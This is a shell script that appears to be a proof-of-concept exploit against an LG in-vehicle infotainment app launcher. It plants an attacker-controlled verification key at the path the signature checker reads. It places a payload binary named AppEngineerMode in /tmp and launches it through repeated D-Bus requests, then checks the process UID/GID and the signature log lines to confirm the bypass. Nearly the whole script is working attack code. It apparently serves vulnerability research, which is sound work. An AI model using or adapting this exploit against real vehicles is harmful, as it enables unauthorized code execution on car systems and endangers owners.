#!/bin/sh
BB=/bin/busybox
export XDG_RUNTIME_DIR=/run/user/root WAYLAND_DISPLAY=wayland-0
sh /run-chain23.sh >/tmp/chainv48.out 2>&1 &
W=/tmp/launcher-chain/weston.log; L=/tmp/launcher-chain/launcher.log
i=0; while [ $i -lt 12 ]; do $BB sleep 10; i=$((i+1)); $BB grep -aq 'Surface id(2080)' $W && break; done
echo "HOME_AT=$((i*10))s"
$BB mkdir -p /tmp/app/bin
$BB cp -f /poc/payload.signed /tmp/app/bin/AppEngineerMode
$BB chmod 755 /tmp/app/bin/AppEngineerMode
# the key we control, at the path the verifier reads
$BB cp -f /poc/app_normal.key /tmp/app_normal.key
$BB chmod 644 /tmp/app_normal.key
echo "PAYLOAD_MD5=$($BB md5sum /tmp/app/bin/AppEngineerMode | $BB cut -c1-32)"
echo "KEY_HEAD=$($BB head -1 /tmp/app_normal.key)"
export DBUS_SESSION_BUS_ADDRESS=$($BB cat /tmp/session_appmgr 2>/dev/null)
n=0; P=""
while [ $n -lt 10 ]; do
  n=$((n+1))
  /usr/bin/dbus-send --session --print-reply --dest=com.lge.avn.applauncher /Request com.lge.avn.applauncher.request.launch int32:301 string:AppEngineerMode string:/tmp/app/bin/AppEngineerMode >/dev/null 2>&1
  $BB sleep 12
  P=$($BB pidof AppEngineerMode)
  [ -n "$P" ] && { echo "LAUNCHED=$P after req $n"; break; }
done
[ -z "$P" ] && echo "NOT_LAUNCHED after $n requests"
$BB sleep 10
echo "=== V048 PROOF FILE ==="
$BB cat /tmp/v048-proof.txt 2>/dev/null || echo "(no proof file - payload did not run)"
echo "=== process identity ==="
[ -n "$P" ] && $BB grep -E '^(Uid|Gid)' /proc/$P/status
echo "=== sign artifacts written by the manager ==="
$BB ls -l /tmp/*.sign 2>/dev/null
echo "=== manager signature lines for our payload ==="
$BB grep -aE 'CheckSign|signCheck' $L 2>/dev/null | $BB tail -6 | $BB cut -c1-150
echo DONE
